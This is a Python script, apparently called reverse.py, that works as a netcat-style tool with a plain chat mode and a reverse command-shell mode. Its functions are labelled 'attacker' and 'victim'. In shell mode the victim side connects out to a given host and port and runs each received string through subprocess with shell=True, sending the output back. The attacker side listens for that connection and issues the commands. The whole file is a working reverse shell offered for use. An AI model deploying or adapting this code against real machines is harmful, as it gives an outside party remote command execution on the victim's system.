import getopt
import sys
import os
from socket import socket
from threading import Thread
import subprocess
import time

PORT = 0
IP = ""
LISTEN = False
COMMAND = False

def send(con):
    msg = ""
    try:
        while True:
            print("Insert message to send : ")
            msg = input()
            if msg == "exit":
                con.close()
            con.send(msg.encode())
    except Exception:
        sys.exit(0)
    
def receive(con):
    msg = ""
    try:
        while True:
            msg = con.recv(2048)
            print("---------------------------------------")
            print(msg.decode())
            print("---------------------------------------")
            print("Insert message to send : ")
    except Exception:
        con.close()
        print("[*] Connection Closed")
        sys.exit(0)


def messaging(con):
    s = Thread(target=send,args=(con,))
    r = Thread(target=receive,args=(con,))
    s.start()
    r.start()

location = ""

def send_command(con):
    global location
    location = con.recv(2048).decode()
    location = location.rstrip()
    location += " > "
    msg = ""
    while True:
        time.sleep(0.1)
        msg = input(location)
        if msg == 'exit':
            break
        con.send(msg.encode())
        try:
            if msg.index("cd") >= 0:
                con.send("pwd".encode())
                location = con.recv(2048).decode()
                location = location.strip()
                location += " > "
        except ValueError:
            continue
    con.close()

def receive_result(con):
    global location
    try:
        while True:
            result = con.recv(2048).decode()
            print(result)
    except ConnectionAbortedError:
        print("You closed the connection :>")


def receive_command(con):
    p = subprocess.Popen(["pwd"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    o , _ = p.communicate()
    con.send(o)
    try:
        while True:
            buff = con.recv(2048).decode()
            if buff == 'exit':
                break
            try:
                if buff.index("cd") >= 0:
                    goto = buff.split(" ")
                    p = subprocess.Popen(["pwd"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                    o , _ = p.communicate()
                    strings = "move to "+ o.decode().strip() + " directory"
                    con.send(strings.encode())
                    os.chdir(goto[1])
            except ValueError:
                p = subprocess.Popen([buff],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                o,e = p.communicate()
                if o == b'':
                    con.send(e)
                else:
                    con.send(o)
    except ConnectionResetError:
        print("Connection closed by host :>")

def reverse(con):
    s = Thread(target=send_command,args=(con,))
    r = Thread(target=receive_result,args=(con,))
    s.start()
    r.start()

def attacker():
    global PORT,COMMAND,IP
    IP = "localhost"
    print("[*] Waiting for Connection...")
    sock = socket()
    sock.bind((IP,PORT))
    sock.listen(10)
    con , addr = sock.accept()
    print("[*] Connection is established | %s:%s"%(addr[0],addr[1]))
    if COMMAND:
        reverse(con)
    else:
        messaging(con)

def victim():
    global PORT,COMMAND,IP
    con = socket()
    con.connect((IP,PORT))
    if COMMAND:
        receive_command(con)
    else:
        messaging(con)    

def main():
    global PORT,LISTEN,COMMAND,IP
    if len(sys.argv) == 1:
        print("Usage:")
        print("reverse.py -p [port] -l")
        print("reverse.py -t [target_host] -p [port]")
        print("reverse.py -p [port] -l -c")
        print("reverse.py -t [target_host] -p [port] -c")
        print("")
        print("Description:")
        print("-t --target	- set the target")
        print("-p --port 	- set the port to be used (between 10 and 4096)")
        print("-l --listen 	- listen on [target]:[port] for incoming connections")
        print("-c --command	- initialize a command shell")
        print("")
        print("Example:")
        print("reverse.py -p 8000 -l")
        print("reverse.py -t localhost -p 8000")
        print("reverse.py -p 8000 -l -c")
        print("reverse.py -t localhost -p 8000 -c")
        return
    args , _ = getopt.getopt(sys.argv[1:],"p:lct:",['port=','listen','command','target='])
    for k,v in args:
        if k in ('-p','--port'):
            PORT = int(v)
        elif k in ('-l','--listen'):
            LISTEN = True
        elif k in ('-c','--command'):
            COMMAND = True
        elif k in ('-t','--target'):
            IP = v
    if PORT == 0 or (PORT < 10 or PORT > 4096):
        print("You need to specify the correct port...")
        return
    if LISTEN:
        attacker()
    else:
        if not IP:
            print("The target is required...")
            return
        victim()

main()